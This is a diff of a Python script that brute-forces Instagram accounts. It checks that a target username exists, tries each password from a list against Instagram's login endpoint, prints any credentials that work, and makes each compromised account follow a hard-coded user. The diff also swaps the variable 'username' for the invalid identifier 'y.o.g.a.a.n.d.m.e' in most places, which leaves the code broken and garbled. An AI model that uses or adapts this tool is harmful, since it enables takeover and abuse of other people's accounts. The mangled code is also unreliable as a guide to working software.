@@ -16,18 +16,18 @@ else:
 
 
 
-def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+def userExists(y.o.g.a.a.n.d.m.e):
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % y.o.g.a.a.n.d.m.e) 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'username':y.o.g.a.a.n.d.m.e,'id':fUserID}
 
 
-def Login(username,password):
+def Login(y.o.g.a.a.n.d.m.e,password):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'username':y.o.g.a.a.n.d.m.e, 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -67,22 +67,22 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
-	if (username == False):
+def follow(sess, y.o.g.a.a.n.d.m.e):
+	username = userExists(y.o.g.a.a.n.d.m.e)
+	if (y.o.g.a.a.n.d.m.e == False):
 		return	
 	else:
-		userID = username['id']
+		userID = y.o.g.a.a.n.d.m.e['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
 		print (followReq.text)
 
 
 username = str(input('Please enter a username: '))
-username = userExists(username)
+username = userExists(y.o.g.a.a.n.d.m.e)
 if (username == False):
 	exit()
 else:
-	username = username['username']
+	username = y.o.g.a.a.n.d.m.e['username']
 
 
 
@@ -93,7 +93,7 @@ for i in range(len(passwords)):
 	password = passwords[i]
 	sess = Login(username,password)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [y.o.g.a.a.n.d.m.e,password])
 
 		#because i am cool
 		follow(sess,'avr_amit')
